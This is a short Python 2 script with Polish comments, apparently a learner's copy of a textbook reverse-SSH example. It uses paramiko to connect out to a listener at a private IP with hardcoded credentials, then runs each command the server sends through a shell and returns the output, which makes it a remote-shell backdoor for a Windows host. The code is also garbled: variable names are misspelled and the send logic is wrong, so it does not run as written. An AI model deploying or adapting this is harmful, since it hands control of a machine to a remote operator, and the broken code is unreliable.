#coding=utf-8

import threading
import paramiko
import subprocess

def ssh_command(ip, user, passwd, command):
	""" Fukcja mogąca wykonywać polecenia przez SSH na kliencie Windows
	Normanie do łączenia się z serwerem SSH używa się klientaq SSH, ale ponieważ
	Windows standardowo nie zawiera takiego serwera, należy odwrócić ten proces i 
	wysyłać polecenia od naszego serwera SSH do klienta SSH	"""

	client = paramiko.SSHClient()
	#client.load_host_keys('/home/justin/.ssh/knows_hosts')
	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	client.connect(ip, username=user, password=passwd)
	ssh_session = client.get_transport().open_session()
	if ssh_ssesion.send(command):
		ssh_ssesion.send(command)
		print ssh_ssesionh.recv(1024)#Odczytuje baner
		while True:
			command = ssh_session.recv(1024) #obiera polecenia od serwera SSH
			try:
				cmd_output = subprocess.check_output(command, shell=True)
				ssh_session.send(cmd_output)
			except Exception, e:
				ssh_session.send(str(e))
		client.close()
	return
ssh_command('192.168.0.106', 'justin', 'lovestepython', 'ClientConnected')